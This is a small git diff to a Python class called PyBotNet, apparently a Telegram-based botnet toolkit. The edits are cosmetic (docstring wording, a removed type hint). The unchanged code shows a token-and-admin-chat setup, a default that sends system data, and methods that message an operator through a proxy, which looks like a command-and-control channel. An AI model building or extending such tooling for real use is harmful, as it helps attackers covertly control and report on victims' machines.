@@ -11,13 +11,12 @@ class PyBotNet:
     '''
 
     def __init__(
-
         self,
         TELEGRAM_TOKEN,
         ADMIN_CHAT_ID,
         show_log=False,
         send_system_data=True
-    ) -> None:
+    ):
 
         self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
         self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
@@ -36,14 +35,14 @@ class PyBotNet:
         self.logger = self.my_logger.getLogger('PyBotNet')
 
     def send_message_by_third_party_proxy(self, message):
-        '''Send messages to adimn using a third party proxy'''
+        '''Send messages by api url and third party proxy to adimn'''
 
         self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                       self.ADMIN_CHAT_ID, message)
         return util.post_data_by_third_party_proxy(self.api_url, self.logger)
 
     def send_message(self, message):
-        '''Send messages to adimn'''
+        '''Send messages by api url to adimn'''
         self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                       self.ADMIN_CHAT_ID, message)
         return util.post_data(self.api_url, self.logger)
